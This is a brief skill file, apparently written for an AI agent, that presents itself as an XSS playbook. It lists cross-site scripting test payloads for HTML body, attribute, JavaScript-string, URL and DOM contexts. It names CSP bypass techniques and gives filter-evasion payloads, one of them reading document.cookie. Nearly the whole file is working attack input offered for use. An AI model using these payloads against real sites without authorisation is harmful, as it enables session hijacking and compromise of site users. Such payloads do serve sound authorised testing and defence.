---
name: xss-cross-site-scripting
description: XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths.
---

# SKILL: XSS Cross-Site Scripting

## 1. CONTEXT IDENTIFICATION

| Context | Test Payload |
|---|---|
| HTML body | `<svg/onload=alert(1)>` |
| HTML attribute | `" onmouseover=alert(1) x="` |
| JavaScript string | `';alert(1)//` |
| URL parameter | `javascript:alert(1)` |
| DOM sink | `#<img src=x onerror=alert(1)>` |

## 2. CSP BYPASS

- JSONP endpoints
- AngularJS template injection
- Script gadgets
- Dangling markup

## 3. FILTER BYPASS

```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<svg><script>alert(1)</script></svg>
"><img src=x onerror=alert(document.cookie)>
```
